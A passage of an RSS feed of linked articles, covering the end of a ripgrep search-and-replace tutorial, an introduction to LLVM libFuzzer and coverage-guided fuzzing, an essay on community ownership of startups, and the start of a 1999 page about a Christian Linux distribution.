</span></code></pre><br>
<h2 id="rust-regex-and-pcre2">Rust regex and PCRE2<a href="#rust-regex-and-pcre2" aria-label="Anchor link for: rust-regex-and-pcre2">🔗</a></h2>
<p>By default, <code>rg</code> uses Rust regular expressions, which is much more featured compared to <code>GNU sed</code>. The main feature not supported is backreference within regexp definition (for performance reasons). See <a href="https://docs.rs/regex/1.3.9/regex/index.html">Rust regex documentation</a> for regular expression syntax and features. <code>rg</code> supports Unicode by default.</p>
<pre><code><span># non-greedy quantifier is supported
</span><span>$ s=</span><span>'food land bark sand band cue combat'</span><span>
$ echo </span><span>"$s" </span><span>|</span><span> rg </span><span>--</span><span>passthru </span><span>'foo.*?ba' </span><span>-</span><span>r </span><span>'[xyz]'
</span><span>[xyz]rk sand band cue combat

</span><span># unicode support
</span><span>$ echo </span><span>'fox:αλεπού,eagle:αετός' </span><span>|</span><span> rg </span><span>--</span><span>passthru </span><span>'\p{L}+' </span><span>-</span><span>r </span><span>'($0)'
</span><span>(fox)</span><span>:</span><span>(αλεπού),(eagle)</span><span>:</span><span>(αετός)

</span><span># set operator example, remove all punctuation characters except . ! and ?
</span><span>$ para=</span><span>'"hi", there! how *are* you? all fine here.'</span><span>
$ echo </span><span>"$para" </span><span>|</span><span> rg </span><span>--</span><span>passthru </span><span>'[[:punct:]--[.!?]]+' </span><span>-</span><span>r </span><span>''</span><span>
hi there! how are you? all fine here.
</span></code></pre>
<p>The <code>-P</code> switch will enable <a href="https://www.pcre.org/current/doc/html/index.html">PCRE2</a> flavor, which has even more tricks. You can also use <code>--engine=auto</code> to allow <code>rg</code> to automatically use <code>PCRE2</code> when needed (for example: useful as an alias for <code>rg</code> command so that it gives performance of Rust engine by default and use <code>PCRE2</code> only when needed).</p>
<pre><code><span># backreference within regexp definition
</span><span>$ s=</span><span>'cocoa appleseed tool speechless'</span><span>
$ echo </span><span>"$s" </span><span>|</span><span> rg </span><span>--</span><span>passthru </span><span>-</span><span>wP </span><span>'([a-z]*([a-z])\2[a-z]*){2}' </span><span>-</span><span>r </span><span>'{$0}'</span><span>
cocoa {appleseed} tool {speechless}

</span><span># replace all whole words except 'imp' and 'ant'
</span><span>$ s=</span><span>'tiger imp goat eagle ant important'</span><span>
$ echo </span><span>"$s" </span><span>|</span><span> rg </span><span>--</span><span>passthru </span><span>-</span><span>P </span><span>'\b(imp|ant)\b(*SKIP)(*F)|\w+' </span><span>-</span><span>r </span><span>'[$0]'
</span><span>[tiger] imp [goat] [eagle] ant [important]

</span><span># recursively match parentheses
</span><span>$ eqn=</span><span>'(3+a)x * y((r-2)*(t+2)/6) + z(a(b(c(d(e)))))'</span><span>
$ echo </span><span>"$eqn" </span><span>|</span><span> rg </span><span>--</span><span>passthru </span><span>-</span><span>P </span><span>'\((?:[^()]++|(?0))++\)' </span><span>-</span><span>r </span><span>''</span><span>
x </span><span>*</span><span> y </span><span>+</span><span> z

$ </span><span># all lowercase letters and optional hyphen combo from start of string
</span><span>$ s=</span><span>'apple-fig-mango guava grape'</span><span>
$ echo </span><span>"$s" </span><span>|</span><span> rg </span><span>--</span><span>passthru </span><span>-</span><span>P </span><span>'\G([a-z]+)(-)?' </span><span>-</span><span>r </span><span>'($1)$2'
</span><span>(apple)</span><span>-</span><span>(fig)</span><span>-</span><span>(mango) guava grape
</span></code></pre><br>
<h2 id="extract-and-modify">Extract and modify<a href="#extract-and-modify" aria-label="Anchor link for: extract-and-modify">🔗</a></h2>
<p>The <code>-r</code> option can be used when <code>-o</code> option is active too. The example shown below is not easy to do with <code>sed</code>.</p>
<pre><code><span>$ s=</span><span>'0501 035 154 12 26 98234'

</span><span># numbers &gt;= 100 and ignore leading zeros
</span><span>$ echo </span><span>"$s" </span><span>|</span><span> rg </span><span>-</span><span>woP </span><span>'0*+(\d{3,})' </span><span>-</span><span>r </span><span>'"$1"' </span><span>|</span><span> paste </span><span>-</span><span>sd,
</span><span>"501"</span><span>,</span><span>"154"</span><span>,</span><span>"98234"
</span></code></pre><br>
<h2 id="fixed-string-matching">Fixed string matching<a href="#fixed-string-matching" aria-label="Anchor link for: fixed-string-matching">🔗</a></h2>
<p>Like <code>grep</code>, the <code>-F</code> option will allow fixed strings to be matched, a handy option that I feel every search and replace tool should provide.</p>
<pre><code><span>$ </span><span>printf </span><span>'2.3/[4]*6\nfoo\n5.3-[4]*9\n' </span><span>|</span><span> rg </span><span>--</span><span>passthru </span><span>-</span><span>F </span><span>'[4]*' </span><span>-</span><span>r </span><span>'2'
</span><span>2.3</span><span>/</span><span>26</span><span>
foo
</span><span>5.3</span><span>-</span><span>29
</span></code></pre>
<p><code>-F</code> doesn't extend to replacement section though, so you need <code>$$</code> instead of <code>$</code> character to represent it literally.</p>
<pre><code><span>$ echo </span><span>'a.*{2}-b' </span><span>|</span><span> rg </span><span>--</span><span>passthru </span><span>-</span><span>F </span><span>'.*{2}' </span><span>-</span><span>r </span><span>'+$x\tc'</span><span>
a</span><span>+</span><span>\tc</span><span>-</span><span>b
$ echo </span><span>'a.*{2}-b' </span><span>|</span><span> rg </span><span>--</span><span>passthru </span><span>-</span><span>F </span><span>'.*{2}' </span><span>-</span><span>r </span><span>'+$$x\tc'</span><span>
a</span><span>+</span><span>$x</span><span>\tc</span><span>-</span><span>b
</span></code></pre><br>
<h2 id="multiline-matching">Multiline matching<a href="#multiline-matching" aria-label="Anchor link for: multiline-matching">🔗</a></h2>
<p>Another handy option is <code>-U</code> which enables multiline matching.</p>
<pre><code><span>$ s=</span><span>'hi there\nhave a nice day\nbye'

</span><span># (?s) flag will allow . to match newline characters as well
</span><span>$ </span><span>printf </span><span>'</span><span>%b</span><span>' "$s" </span><span>|</span><span> rg </span><span>--</span><span>passthru </span><span>-</span><span>U </span><span>'(?s)the.*ice' </span><span>-</span><span>r </span><span>''</span><span>
hi  day
bye
</span></code></pre><br>
<h2 id="handling-dos-style-input">Handling dos-style input<a href="#handling-dos-style-input" aria-label="Anchor link for: handling-dos-style-input">🔗</a></h2>
<p><code>rg</code> provides support for dos-style files with <code>--crlf</code> option.</p>
<pre><code><span># same as: sed -E 's/\w+(\r?)$/xyz\1/'
# note that output will retain CR+LF as line ending
# similar to the sed solution, this will work for unix-style input too
</span><span>$ </span><span>printf </span><span>'hi there\r\ngood day\r\n' </span><span>|</span><span> rg </span><span>--</span><span>passthru </span><span>--</span><span>crlf </span><span>'\w+$' </span><span>-</span><span>r </span><span>'xyz'</span><span>
hi xyz
good xyz
</span></code></pre><br>
<h2 id="speed-comparison-with-gnu-sed">Speed comparison with GNU sed<a href="#speed-comparison-with-gnu-sed" aria-label="Anchor link for: speed-comparison-with-gnu-sed">🔗</a></h2>
<p>Another advantage of <code>rg</code> is that it is likely to be faster than <code>sed</code>. See <a href="https://blog.burntsushi.net/ripgrep/">ripgrep benchmark with other grep implementations</a> by the author for a methodological detailed analysis and insights.</p>
<pre><code><span># for small files, initial processing time of rg is a large component
</span><span>$ time echo </span><span>'aba' </span><span>|</span><span> sed </span><span>'s/a/b/g' </span><span>&gt;</span><span> f1
real	0m0.002s
$ time echo </span><span>'aba' </span><span>|</span><span> rg </span><span>--</span><span>passthru </span><span>'a' </span><span>-</span><span>r </span><span>'b' </span><span>&gt;</span><span> f2
real	0m0.007s

</span><span># for larger files, rg is likely to be faster
# 6.2M sample ASCII file
</span><span>$ wget </span><span>'https://norvig.com/big.txt'</span><span>
$ time </span><span>LC_ALL</span><span>=</span><span>C</span><span> sed </span><span>'s/\bcat\b/dog/g'</span><span> big.txt </span><span>&gt;</span><span> f1
real	0m0.060s
$ time rg </span><span>--</span><span>passthru </span><span>'\bcat\b' </span><span>-</span><span>r </span><span>'dog'</span><span> big.txt </span><span>&gt;</span><span> f2
real	0m0.048s
$ diff </span><span>-</span><span>s f1 f2
</span><span>Files</span><span> f1 </span><span>and</span><span> f2 are identical

</span><span># nearly 8 times faster!!
</span><span>$ time </span><span>LC_ALL</span><span>=</span><span>C</span><span> sed </span><span>-</span><span>E </span><span>'s/\b(\w+)(\s+\1)+\b/\1/g'</span><span> big.txt </span><span>&gt;</span><span> f1
real	0m0.725s
$ time rg </span><span>--</span><span>no</span><span>-</span><span>unicode </span><span>--</span><span>passthru </span><span>-</span><span>wP </span><span>'(\w+)(\s+\1)+' </span><span>-</span><span>r </span><span>'$1'</span><span> big.txt </span><span>&gt;</span><span> f2
real	0m0.093s
$ diff </span><span>-</span><span>s f1 f2
</span><span>Files</span><span> f1 </span><span>and</span><span> f2 are identical
</span></code></pre><br>
<h2 id="other-alternatives-for-sed">Other alternatives for sed<a href="#other-alternatives-for-sed" aria-label="Anchor link for: other-alternatives-for-sed">🔗</a></h2>
<ul>
<li><a href="https://unix.stackexchange.com/questions/112023/how-can-i-replace-a-string-in-a-files/251742#251742">rpl</a> — search and replace tool, has interesting options like interactive mode and recursive mode</li>
<li><a href="https://github.com/chmln/sd">sd</a> — simple search and replace, implemented in Rust</li>
<li><a href="https://www.perl.org/">perl</a> and <a href="https://www.ruby-lang.org/en/">ruby</a> — programming languages with excellent command line support</li>
</ul>

    </div>

    
    

    

    
    
</article></div>]]>
            </description>
            <link>https://learnbyexample.github.io/substitution-with-ripgrep/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24503895</guid>
            <pubDate>Thu, 17 Sep 2020 12:43:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Introduction to LLVM LibFuzzer]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24503889">thread link</a>) | @fcambus
<br/>
September 17, 2020 | https://www.moritz.systems/blog/an-introduction-to-llvm-libfuzzer/ | <a href="https://web.archive.org/web/*/https://www.moritz.systems/blog/an-introduction-to-llvm-libfuzzer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p>Fuzzing is a software testing method that involves passing malformed
data as input to the program and monitoring it for misbehavior.
Today, fuzzing is one of the most effective ways to find software security problems.
In 2014, Michał Zalewski presented American Fuzzy Lop, the first coverage
guided fuzzer. This started the modern world of fuzzing solutions and
techniques on the market.</p>

<p>In this article, we will discuss libFuzzer, a LLVM utility that allows you to integrate fuzzing
methodology into your libraries, and briefly introduce techniques to maximize the effectiveness
of catching problems.</p>



<p><a href="https://llvm.org/docs/LibFuzzer.html">libFuzzer</a>
is part of the <a href="https://llvm.org/">LLVM</a>
package. It allows you to integrate the
coverage-guided fuzzer logic into your C / C++ application. A crucial feature
of libFuzzer is its close integration with
<a href="https://clang.llvm.org/docs/SanitizerCoverage.html">Sanitizer Coverage</a>
and bug detecting sanitizers, namely:
<a href="https://clang.llvm.org/docs/AddressSanitizer.html">Address Sanitizer</a>,
<a href="https://clang.llvm.org/docs/LeakSanitizer.html">Leak Sanitizer</a>,
<a href="https://clang.llvm.org/docs/MemorySanitizer.html">Memory Sanitizer</a>,
<a href="https://clang.llvm.org/docs/ThreadSanitizer.html">Thread Sanitizer</a>
and <a href="https://clang.llvm.org/docs/UndefinedBehaviorSanitizer.html">Undefined Behavior Sanitizer</a>.
The use of these projects
ensures that a wide range of memory corruption bugs and undesired
application behavior are detected. A few examples of these are: Heap/Stack/Global Out Of Bounds,
Use After Free, Use After Return, Uninitialized Memory Reads, Memory Leaks
or Uninitialized Mutex Use.</p>

<p>Everything is provided with a relatively low performance and memory overhead.
The project requires merely a functional LLVM 5.0 toolchain or newer (release date: 07 Sep 2017).</p>



<p>AFL has been on the market since 2014 and has been able to detect
over 1000 different types of software errors.  When the development of
the <a href="https://github.com/google/AFL">original AFL repository</a> stalled for
a long time, the community created a fork called
<a href="https://github.com/AFLplusplus/AFLplusplus">AFL++</a> in 2018.
The development of Google hosted project was eventually resumed
by a different team of Google employees (as Michał Zalewski changed
his workplace). Therefore, there are two independent versions of AFL
in active development today.</p>

<p>The design of AFL is primarily based on code coverage through tracing code path execution
(with SanitizerCoverage), then providing feedback to the fuzzer (again with SanitizerCoverage callbacks),
and then using genetic algorithms to craft new inputs
(using <a href="https://en.wikipedia.org/wiki/Standard_streams">standard input</a>) to widen the code coverage.
The <a href="https://github.com/google/AFL#2-the-afl-fuzz-approach">simplified algorithm of AFL</a> is as follows:</p>

<ol>
<li>Load user-supplied initial test cases into the queue,</li>
<li>Take the next input file from the queue,</li>
<li>Attempt to trim the test case to the smallest size that doesn’t alter the measured behavior of the program,</li>
<li>Repeatedly mutate the file using a balanced and well-researched variety of traditional fuzzing strategies,</li>
<li>If any of the generated mutations results in a transition to a new state recorded by the instrumentation, add mutated output as a new entry in the queue.</li>
<li>Go to point 2.</li>
</ol>

<p>The readers might ask, why create a new fuzzer?</p>

<p>First of all, AFL was incapable of handling different types of coverage, such as
tracking the evaluation of comparison instructions (in C <code>==</code>, <code>&gt;</code>, <code>&lt;</code>, <code>!=</code>, etc.).
Next, AFL was unaware of tracking the evaluation of standard (and non-standard)
functions that return certain values depending on the input, such as
the functions for comparing strings (in C <code>strcmp()</code>, <code>strncmp()</code>, etc.).
Finally, AFL was not sufficiently flexible to integrate in environments that
accept input from a different source than the <code>standard input</code>.</p>

<p>The Google employees created a new fuzzer to overcome all the mentioned limitations
and take advantage of the bug detecting features that were already present in LLVM.
The libFuzzer philosophy was to create a tool that operates
similarly to unit testing. We write a small fuzzing program (called the “harness”)
and create programming environment to quickly integrate it into projects
that consists of callable set of functions, typically API of a library.
The fuzzer input is provided as parameters to a regular C function (instead of stdin),
and if possible the fuzzing process is run in persistent mode that
avoids respawning it for every input.</p>

<p>The simplest integration of libFuzzer is as follows:</p>

<pre><code>// fuzz_API.cpp
extern "C" int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) {
  DoSomethingWithMyAPI(Data, Size);
  return 0;
}
</code></pre>

<p>There are two arguments to the <code>LLVMFuzzerTestOneInput()</code> function, Data and Size.
This is the buffer of a fixed length that then has to be processed by our
unit testing-like program and passed on to our API.</p>

<p>That said, libFuzzer is tailored towards:</p>

<ul>
<li>Fuzzing libraries and their APIs, rather than standalone programs.</li>
<li>The behavior should be as deterministic as possible. The same input must result in the same output.</li>
<li>The called library should avoid exiting (by <code>exit()</code> or raising signals) for valid code paths.</li>
<li>It should avoid mutating the global state as otherwise it will confuse the fuzzer.</li>
<li>It should evaluate as quickly as possibly, returning to the fuzzer.</li>
<li>It may use threads, but all newly spawned threads should be joined before returning to libFuzzer.</li>
<li>Collecting diverse sources of coverage as productive as possible.</li>
</ul>

<p>AFL is better for one type of projects and libFuzzer for another one.
For example, projects that are not designed as libraries
are hard to integrate with libFuzzer, while entry barrier to AFL testing
can be lower. It is a matter of rebuilding the software and running the fuzzer as-is.</p>

<p>As we presented above libFuzzer operates entirely inside the memory while AFL
feeds the fuzzed program with specially crafted files and passed them to its input.</p>



<p>The fuzzing process begins with the construction of test corpora.
In the case of libFuzzer, this is not necessarily true - it
can generate entirely random input. Of course, this implies practically
no code coverage at the start, and many hours of work before the first
input passing initial integrity checks is produced. Therefore, it is
worth having even a few/odd test cases to start with.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/fuzzing_corpora.svg" alt="Fuzzing corpora"></p>

<p>The goal of minimizing the test files is to get as much code coverage as possible
with as small input file size as possible. The relation is simple:
the smaller the file, the more executions per second can be achieved. It is worth adding that
there is also a process of minimizing a single input file. This operation aims
to remove any redundant data from the test case causing the crash to capture
what exactly happened. According to the libFuzzer documentation, the minimum speed
at which it is worthwhile to start meaningful fuzzing with a prepared body is
1000 iterations per second.</p>

<p>Crash management usually boils down to deduplicating a set of test cases by
comparing the function call stack or a stack trace. Due to limited fuzzer
information during a crash, there are different approaches to solve the
problem here. libFuzzer does not have a module for managing test cases,
and every new fuzzing job is a “clean card” for it. The user must automate
this process by writing the report parser himself/herself.</p>

<p>Readers are encouraged to create and maintain their test corpora - in
the long run, and this is much better than using the “ready-made”
ones found on the Internet or, as mentioned earlier, generating one from scratch.
It is worth categorizing the corpus per application (in case of a single
application) or per file type - if we test many different programs, using
the same file formats.</p>

<p>The more diverse the initial test data, the better. The corpus continuously
evolves during fuzzing: you find inputs that pass through previously unknown
paths in the code. During the operation, smaller files push large files
out of the corpus (if they provide equivalent code coverage). Of course,
you find test cases that cause the program to terminate. The process of
merging the corpus is nothing more than minimizing the sum of the sets:
the corpora that started fuzzing and the newly created test cases.</p>



<p>As mentioned earlier, to use libFuzzer in your projects, you need to prepare
a lightweight library entry code.</p>

<p>Let’s see at a real world example from the LLVM libFuzzer test-suite, an
example called
<a href="https://github.com/llvm/llvm-project/blob/master/compiler-rt/test/fuzzer/SingleStrcmpTest.cpp">SingleStrcmpTest.cpp</a></p>

<pre><code>// Part of the LLVM Project, under the Apache License v2.0 with LLVM Exceptions.
// See https://llvm.org/LICENSE.txt for license information.
// SPDX-License-Identifier: Apache-2.0 WITH LLVM-exception

// Simple test for a fuzzer. The fuzzer must find a particular string.
#include &lt;cstdint&gt;
#include &lt;cstdio&gt;
#include &lt;cstdlib&gt;
#include &lt;cstring&gt;

extern "C" int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) {
  if (Size &gt;= 7) {
    char Copy[7];
    memcpy(Copy, Data, 6);
    Copy[6] = 0;
    if (!strcmp(Copy, "qwerty")) {
      fprintf(stderr, "BINGO\n");
      exit(1);
    }
  }
  return 0;
}
</code></pre>

<p>In this example, we have two conditions for triggering the bug (in our case, calling <code>exit(2)</code> and exiting):</p>

<ul>
<li>Size of the input buffer is larger or equal to 7 bytes.</li>
<li>The first 6 bytes store the sequence <code>"qwerty"</code>, followed by <code>\0</code>.</li>
<li>The rest of the input buffer is ignored.</li>
</ul>

<p>We note that there is no <code>main()</code> function in the program, as it is provided directly by the
libFuzzer library. Besides that, the code contains SanCov instrumentation that feedbacks the fuzzer.</p>

<p>This fuzzer uses the <code>strcmp(3)</code> function interceptors that are integrated through Address Sanitizer
into the coverage reporting mechanism in libFuzzer. Thus, there are two ways of executing the program,
with Address Sanitizer enabled and without, and we can see the difference. This also illustrates that
even if the code path is relatively simple, AFL would be totally incapable of guessing code
to break <code>strcmp(3)</code> conditionals in the code and passing random inputs, possibly even never breaking
the program in a finite time.</p>

<p>This happens inside
<a href="https://github.com/llvm/llvm-project/blob/master/compiler-rt/lib/sanitizer_common/sanitizer_common_interceptors.inc">sanitizer_common_interceptors.inc</a>:</p>

<pre><code>DECLARE_WEAK_INTERCEPTOR_HOOK(__sanitizer_weak_hook_strcmp, uptr called_pc,
                              const char *s1, const char *s2, int result)

INTERCEPTOR(int, strcmp, const char *s1, const char *s2) {
  void *ctx;
  COMMON_INTERCEPTOR_ENTER(ctx, strcmp, s1, s2);
  unsigned char c1, c2;
  uptr i;
  for (i = 0;; i++) {
    c1 = (unsigned char)s1[i];
    c2 = (unsigned char)s2[i];</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.moritz.systems/blog/an-introduction-to-llvm-libfuzzer/">https://www.moritz.systems/blog/an-introduction-to-llvm-libfuzzer/</a></em></p>]]>
            </description>
            <link>https://www.moritz.systems/blog/an-introduction-to-llvm-libfuzzer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24503889</guid>
            <pubDate>Thu, 17 Sep 2020 12:42:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Exit to community – what if startups could be owned by their users?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24503881">thread link</a>) | @joshsharp
<br/>
September 17, 2020 | https://www.noemamag.com/exit-to-community/ | <a href="https://web.archive.org/web/*/https://www.noemamag.com/exit-to-community/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

				<div>
  <p>Credits</p>
  <p><span>Nathan Schneider is an assistant professor of media studies at the University of Colorado. He is the co-author of “<a href="https://www.colorado.edu/lab/medlab/exit-to-community">Exit to Community: A Community Primer</a>” and author of“Everything for Everyone: The Radical Tradition That Is Shaping the Next Economy.”</span></p>
</div>


<p>Perhaps you remember the time, in the fall of 2016, when rumors swirled that Twitter might be up for sale. As a reporter, I’d come to depend on Twitter. I first started using it heavily during the Arab Spring in 2011, enabling me to follow events on the ground in real-time and connect with activists directly. It felt shocking to me that this tool, which had become so important to my work and my life, was also a commodity. The news reports said maybe Disney or Google would buy it, or maybe Salesforce. This all seemed so arbitrary.</p>



<p>With some nudging from friends, I wrote an <a href="https://www.theguardian.com/commentisfree/2016/sep/29/save-twitter-buy-platform-shared-ownership">article</a> in the Guardian suggesting Twitter should be owned by its users instead. What if that mere feeling that I had of ownership, as a participant in the Twitter-verse, was actually expressed in how the company was owned? I’ve written a lot of articles over the years that propose fantastical ideas; usually, they just plunk in the water. But this time, people around the world actually started organizing. I wasn’t the only person who felt this way. And we had a head start: Many of us had already been working together under the banner of “<a href="https://www.fastcompany.com/40575728/worker-owned-co-ops-are-coming-for-the-digital-gig-economy">platform cooperativism</a>,” trying to graft the lessons of old worker-owned factories and member-owned credit unions into the online economy.</p>



<p>First, we circulated a <a href="https://www.change.org/p/twitter-inc-vote-yes-to-a-co-op-with-your-users">petition campaign</a>, asking Twitter to consider user ownership. Then we realized we had shares of Twitter stock in our community, and we could use those to make a shareholder proposal to the company itself. We had a bit of a legal battle with the company, which tried to strike down our proposal through the American Securities and Exchange Commission. But we won, and the proposal went forward. At the annual meeting in early 2017, we won nearly 5% of the vote — which doesn’t sound like a lot, but it was more than we expected, and it meant we could resubmit later. We also got a lot of attention: articles covered us in <a href="https://www.wired.com/2016/11/lets-build-next-twitter-like-green-bay-packers/">Wired</a>, <a href="https://www.vanityfair.com/news/2017/04/twitter-users-petition-co-op-shareholder-meeting">Vanity Fair</a> and about a <a href="https://www.buytwitter.org/press/">hundred other places</a>. The press thought what we were doing was crazy enough to be interesting. And then life went on.</p>



<p>Or did it? Something weird keeps happening. Those of us working on platform cooperativism have tended to think of ourselves as radicals working against Big Tech. So it came as a surprise to me when, in 2018 and 2019, several of the biggest, baddest tech companies began filing letters to the Securities and Exchange Commission, asking it to allow them to share ownership with their users — to distribute company stock among the very user-workers the platforms refused to classify as employees. </p>



<p>These platforms included the likes of Airbnb and Uber. Like Twitter, these are multi-sided marketplaces that leverage user loyalty to entice fickle investor-owners. Their demand was a modest step, to say the least, yet it looked eerily like a step in the direction of the radicalism we had been calling for — building democracy into the businesses themselves, into how they are owned and governed. The Airbnb letter even <a href="https://www.nytimes.com/2018/09/21/business/dealbook/airbnb-hosts-shareholders.html">articulated</a> a lot of the rationales that we had been harping on in our little radical world for a few years.</p>



<p>The companies, of course, had their own interests at heart — several seemed to think it might buttress going public on Wall Street — but the letters made me wonder if a deal could be struck. At a time when regulators are starting to clamp down on the big platform companies, what if we could meet the companies in the middle and create a new kind of paradigm, a kind of race to the top? What if companies competed with each other not to extract more data from their users or suppress working conditions, wiping away rights that people have fought for over generations, but instead to offer better deals through shared ownership? </p>



<p>For the same reasons that startups often share stock with early employees, the platforms would get economic alignment with their users and loyalty. Society as a whole would get more built-in accountability for our platforms, a kind of accountability that doesn’t rely on any one jurisdiction or legislature. What if, in turn, we had a new kind of story available to tech startups, a new mythology?</p>


<!-- Content Image Block Template -->
<div>

  <div>

    <!-- Main Image -->
    <div>

            <div>
              <p><img width="2560" height="1707" src="https://www.noemamag.com/wp-content/uploads/2020/08/GettyImages-1027071040-1-scaled.jpg" alt="" srcset="https://www.noemamag.com/wp-content/uploads/2020/08/GettyImages-1027071040-1-scaled.jpg 2560w, https://www.noemamag.com/wp-content/uploads/2020/08/GettyImages-1027071040-1-300x200.jpg 300w, https://www.noemamag.com/wp-content/uploads/2020/08/GettyImages-1027071040-1-1024x683.jpg 1024w, https://www.noemamag.com/wp-content/uploads/2020/08/GettyImages-1027071040-1-768x512.jpg 768w, https://www.noemamag.com/wp-content/uploads/2020/08/GettyImages-1027071040-1-1536x1024.jpg 1536w, https://www.noemamag.com/wp-content/uploads/2020/08/GettyImages-1027071040-1-2048x1365.jpg 2048w, https://www.noemamag.com/wp-content/uploads/2020/08/GettyImages-1027071040-1-578x385.jpg 578w, https://www.noemamag.com/wp-content/uploads/2020/08/GettyImages-1027071040-1-750x500.jpg 750w, https://www.noemamag.com/wp-content/uploads/2020/08/GettyImages-1027071040-1-960x640.jpg 960w, https://www.noemamag.com/wp-content/uploads/2020/08/GettyImages-1027071040-1-1200x800.jpg 1200w, https://www.noemamag.com/wp-content/uploads/2020/08/GettyImages-1027071040-1-1980x1320.jpg 1980w, https://www.noemamag.com/wp-content/uploads/2020/08/GettyImages-1027071040-1-600x400.jpg 600w" sizes="(max-width: 2560px) 100vw, 2560px"></p>
      </div>

              <div>
              
      <figcaption>
        <p>Twitter CEO Jack Dorsey testifies in the Senate in 2018. (Drew Angerer/Getty)</p>
      </figcaption>

            </div>
      
    </div>


      </div>

</div>



<h5><strong>Another Narrative</strong></h5>



<p>If you’re forming a startup, there are generally two kinds of stories to choose from about what the startup is for. Keep in mind that startups are companies that are trying to take over some subsection of the world. It’s ambitious stuff, so they tend to take on lots of early investment. They get somebody to give them a lot of money so they can hit the market with disproportionate force. And in order to pay that investment back, they need what’s called an “exit,” which usually comes in two forms: You’re either acquired by a larger company or you go public, selling your company on a market where people can trade your shares based on their speculations about what it’s worth. In both cases, you’re passing the company that you’ve worked to build off to new owners, who in turn might be buying it just to convince future buyers to pay even more for it later. It’s a weirdly normal pyramid scheme of capitalism.</p>



<p>What if there were another way? What if a startup that successfully builds a community could opt for an exit to ownership by that community?</p>



<p>This is not so crazy. The more I look, the more I find activists, lawyers, investors and entrepreneurs around the world who are exploring options along these lines, often while seeking to address some of the deep problems of internet culture. Community ownership could be a way of rooting out the abuses that we often see with the billion-dollar “unicorn” startups that make it big and lose their souls to satisfy financial markets, building accountability into the structure of the companies themselves. Too often, tech platforms get caught in the position of trying to extract as much as they possibly can from their users on behalf of their investor-owners, getting away with as much as they think they can.</p>


<!-- Quote Block Template -->

<div>

  <div>

    <p>
      “What if a startup that successfully builds a community could opt for an exit to ownership by that community?”    </p>

    
    
  </div>
</div>




<p>There’s also a category in the Silicon Valley lexicon called “<a href="https://www.businessinsider.com/drew-houston-dropbox-startup-advice-2018-12">zombies</a>” — the companies that don’t quite become unicorns but aren’t failures either. They’re a dead weight on the investors’ balance sheets because, for one reason or another, nobody wants to buy them. Even if a company like that is making a profit and pleasing users, it can be worthless in the eyes of financial markets if it isn’t poised for the kind of exit options that investors need. What if the <a href="https://www.colorado.edu/lab/medlab/exit-to-community">exit to community</a> strategy could enable these zombies to be cured of their condition?</p>



<p>I have been working with Morshed Mannan, a legal scholar at the Leiden Law School, to sketch out <a href="https://ntnsndr.in/E2C-strategies">different strategies</a> for this based on what has been done before and what seems at least approximately plausible. Allow me to introduce you to our imaginary company, CoSocial. It’s a social network that managed to sprout a gig marketplace and payment system. It’s more or less a combination of Reddit and TaskRabbit — or, if you’re familiar with the Chinese online ecosystem, just think WeChat.</p>



<p>CoSocial has positioned itself as an upstart alternative to the big platform giants. It has taken a small, energetic slice of the market share, especially among people who want to opt out from the giants. Fees from marketplace payments have even made it at least mildly profitable. But its growth has stalled. Every pathway toward unicorn status seems to point in a direction that would drive away its most loyal users — incentivizing clickbait, adopting dismal labor standards — which puts the whole enterprise at risk. The founders and early investors are at a loss about what to do until they started thinking about their user community itself as the answer, and they come up with three ideas for how to proceed.</p>



<h5><strong>Option 1: Trust Buyout</strong></h5>



<p>The first is for users to buy out the investors. But let’s be reasonable: Even the most loyal users probably wouldn’t have the means or inclination to pony up cash to buy the company. Instead, CoSocial could follow the pattern of the U.S. employee stock ownership plan, in which a trust operating on the employees’ behalf borrows money to buy shares in the company — except in this case, on behalf of users. </p>



<p>At first, commercial banks might be reluctant to participate in the deal, but if a foundation committed a significant portion of mission-related investment funds, for instance, other institutions might join in. Within a few years, CoSocial’s profits would pay off the loan and the users’ trust would become able to keep and distribute the dividends. At first, the company would appoint an initial trustee for the trust, but within five years, the position would be elected by user-members.</p>



<p>This kind of shared pool could take a few forms. For instance, CoSocial’s gig workers might want to supplement their incomes with a proportional cut of the profits on a regular basis. But that benefit might be less important for users primarily interested in the social media features; their contribution to the profits might be much smaller when divided among individuals, but significant when pooled. </p>



<p>In that case, perhaps the dividends derived from their use could become a user-controlled fund for developing features or other initiatives that users choose through a participatory budgeting process. Those funds could also be used to support an independent oversight board — a user-accountable version of the one …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.noemamag.com/exit-to-community/">https://www.noemamag.com/exit-to-community/</a></em></p>]]>
            </description>
            <link>https://www.noemamag.com/exit-to-community/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24503881</guid>
            <pubDate>Thu, 17 Sep 2020 12:41:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Jesux (1999)]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24503591">thread link</a>) | @Clex
<br/>
September 17, 2020 | http://pudge.net/jesux/ | <a href="https://web.archive.org/web/*/http://pudge.net/jesux/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<!-- following code added by server. PLEASE REMOVE -->
<!-- preceding code added by server. PLEASE REMOVE -->

<p><img src="http://pudge.net/jesux/JHSYX.gif" alt="JHSYX" height="298" width="249"></p>



<h2>The distribution that will not lead you into temptation</h2>

<h3>What is <a href="http://pudge.net/jesux/jesux.html">Jesux</a>?</h3>

<p>
Jesux (pronounced Hay-sooks) is a new Linux distribution for Christian hackers, schools, families, and churches.  There is already a core distribution being prepared, based on RedHat's distribution.
</p>

<p>
Jesux will aim to be an environment that is pleasant for Christians to work in, with all the amenities a Christian might expect, and when possible, free from worldly influences.
</p>

